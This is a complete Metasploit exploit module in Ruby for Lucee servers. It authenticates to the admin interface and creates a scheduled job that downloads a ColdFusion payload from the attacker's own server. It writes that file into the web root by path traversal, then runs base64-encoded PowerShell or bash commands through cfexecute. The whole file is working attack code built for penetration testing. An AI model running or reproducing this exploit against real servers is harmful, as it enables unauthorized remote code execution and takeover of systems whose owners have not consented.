class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  require 'base64'

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Lucee Authenticated Scheduled Job Code Execution',
        'Description' => %q{
          This module can be used to execute a payload on Lucee servers that have an exposed
          administrative web interface. It's possible for an administrator to create a
          scheduled job that queries a remote ColdFusion file, which is then downloaded and executed
          when accessed. The payload is uploaded as a cfm file when queried by the target server. When executed,
          the payload will run as the user specified during the Lucee installation. On Windows, this is a service
          account; on Linux, it is either a root user or a lucee.

          NOTE: Lucee's implementation of ColdFusion does not handle staged payloads well. Use them at your own
          discretion.
        },
        'Targets' => [
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :windows_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/generic'
              }
            }
          ],
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/generic'
              }
            }
          ]
        ],
        'Author' => 'Alex Philiotis', # aphiliotis@synercomm.com
        'License' => MSF_LICENSE,
        'References' => [
          # This abuses the functionality inherent to the Lucee platform and
          # thus is not related to any CVEs.

          # Lucee Docs
          ['URL', 'https://docs.lucee.org/'],

          # cfexecute & cfscript documentation
          ['URL', 'https://docs.lucee.org/reference/tags/execute.html'],
          ['URL', 'https://docs.lucee.org/reference/tags/script.html'],
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [
            # /opt/lucee/server/lucee-server/context/logs/application.log
            # /opt/lucee/web/logs/exception.log
            IOC_IN_LOGS,
            ARTIFACTS_ON_DISK,
            # ColdFusion files located at the webroot of the Lucee server
            # C:/lucee/tomcat/webapps/ROOT/ by default on Windows
            # /opt/lucee/tomcat/webapps/ROOT/ by default on Linux
          ]
        },
        'Stance' => Msf::Exploit::Stance::Aggressive,
        'DisclosureDate' => '2023-02-10'
      )
    )

    register_options(
      [
        Opt::RPORT(8888),
        OptString.new('PASSWORD', [false, 'The password for the administrative interface']),
        OptString.new('TARGETURI', [true, 'The path to the admin interface.', '/lucee/admin/web.cfm']),
        OptInt.new('EXECUTE_DELAY', [false, 'Time in seconds to wait before attempting to access the payload', 1]),
      ]
    )
    deregister_options('URIPATH')
  end

  def exploit
    payload_base = rand_text_alphanumeric(8..16)
    authenticate

    start_service({
      'Uri' => {
        'Proc' => proc do |cli, req|
          print_status("#{peer} - Payload request received: #{req.uri}")
          send_response(cli, cfm_stub)
        end,
        'Path' => '/' + payload_base + '.cfm'
      }
    })

    #
    # Create the scheduled job
    #
    create_job(payload_base)

    #
    # Execute the scheduled job and attempt to send a GET request to it.
    #
    execute_job(payload_base)
    print_good('Exploit completed.')

    #
    # Removes the scheduled job
    #

    print_status('Removing scheduled job' + payload_base)
    cleanup_request = send_request_cgi({
      'method' => 'POST',
      'uri' => target_uri.path + '?action=services.schedule',
      'vars_post' => {
        'row_1' => '1',
        'name_1' => payload_base.to_s,
        'mainAction' => 'delete'
      }
    })
    if cleanup_request && cleanup_request.code == 302
      print_good('Scheduled job removed.')
    else
      print_bad('Failed to remove scheduled job.')
    end
  end

  def authenticate
    auth = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'keep_cookies' => true,
      'vars_post' => {
        'login_passwordweb' => datastore['PASSWORD'],
        'lang' => 'en',
        'rememberMe' => 's',
        'submit' => 'submit'
      }

    })

    if auth && auth.code == 200 && auth.body.include?('nav_Security')
      print_good('Authenticated Successfully')
    else
      fail_with(Failure::NoAccess, 'Unable to authenticate. Please double check your credentials and try again.')
    end
  end

  def create_job(payload_base)
    if (datastore['SRVHOST'] == '0.0.0.0' || datastore['SRVHOST'] == '::')
      srv_host = Rex::Socket.source_address(rhost).to_s
    else
      srv_host = datastore['SRVHOST'].to_s
    end
    exploit_url = "http://#{srv_host}:#{datastore['SRVPORT']}/#{payload_base}.cfm"
    create_job = send_request_cgi({
      'method' => 'POST',
      'uri' => target_uri.path + '?action=services.schedule&action2=create',
      'keep_cookies' => true,
      'vars_post' => {
        'name' => payload_base,
        'url' => exploit_url,
        'interval' => '3600',
        'start_day' => '01',
        'start_month' => '02',
        'start_year' => '2023',
        'start_hour' => '00',
        'start_minute' => '00',
        'start_second' => '00',
        'run' => 'create'
      }
    })
    update_job = send_request_cgi({
      'method' => 'POST',
      'uri' => target_uri.path + '?' + create_job.headers['location'].partition('?').last,
      'keep_cookies' => true,
      'vars_post' => {
        'name' => payload_base,
        'url' => exploit_url,
        'port' => datastore['SRVPORT'],
        'timeout' => '50',
        'username' => '',
        'password' => '',
        'proxyserver' => '',
        'proxyport' => '',
        'proxyuser' => '',
        'proxypassword' => '',
        'publish' => 'true',
        'file' => "..\\..\\..\\..\\#{payload_base}.cfm", # Four path traversals put the file in the web root, whether Windows or Unix systems.
        'start_day' => '01',
        'start_month' => '02',
        'start_year' => '2023',
        'start_hour' => '00',
        'start_minute' => '00',
        'start_second' => '00',
        'end_day' => '',
        'end_month' => '',
        'end_year' => '',
        'end_hour' => '',
        'end_minute' => '',
        'end_second' => '',
        'interval_hour' => '1',
        'interval_minute' => '0',
        'interval_second' => '0',
        'run' => 'update'
      }
    })
    if create_job && create_job.code == 302
      print_good('Job ' + payload_base + ' created successfully')
    else
      fail_with(Failure::Unknown, 'Unable to create job')

    end
    if update_job && update_job.code == 302 || update_job && update_job.code == 200
      print_good('Job ' + payload_base + ' updated successfully')
    else
      fail_with(Failure::Unknown, 'Unable to update job')
    end
  end

  def execute_job(payload_base)
    print_status("Executing scheduled job: #{payload_base}")
    job_execution = send_request_cgi({
      'method' => 'POST',
      'uri' => target_uri.path + '?action=services.schedule',
      'vars_post' => {
        'row_1' => '1',
        'name_1' => payload_base,
        'mainAction' => 'execute'
      }

    })

    if job_execution && job_execution.code == 302
      print_good('Job ' + payload_base + ' executed successfully')
    else
      fail_with(Failure::Unknown, 'Unable to execute job')
    end
    sleep(datastore['EXECUTE_DELAY'])
    execute_payload = send_request_cgi({
      'method' => 'GET',
      'uri' => '/' + payload_base + '.cfm'
    })
    print_good('Payload ' + payload_base + ' executed.')
    if execute_payload && execute_payload.code == 200
      print_status('Output: ' + execute_payload.body)
    end
  end

  def cfm_stub
    case target['Type']
    when :windows_cmd
      <<~CFM.gsub(/^\s+/, '').tr("\n", '')
        <cfscript>
            cfexecute(name="powershell.exe", arguments="-EncodedCommand #{Base64.strict_encode64(payload.encoded.encode('utf-16le'))}",timeout=5);
        </cfscript>
      CFM
    when :unix_cmd
      <<~CFM.gsub(/^\s+/, '').tr("\n", '')
        <cfscript>
            cfexecute(name="/bin/bash", arguments="-c 'echo '#{Base64.strict_encode64(payload.encoded)}' | base64 -d | /bin/bash'",timeout=5);
        </cfscript>
      CFM
    end
  end
end
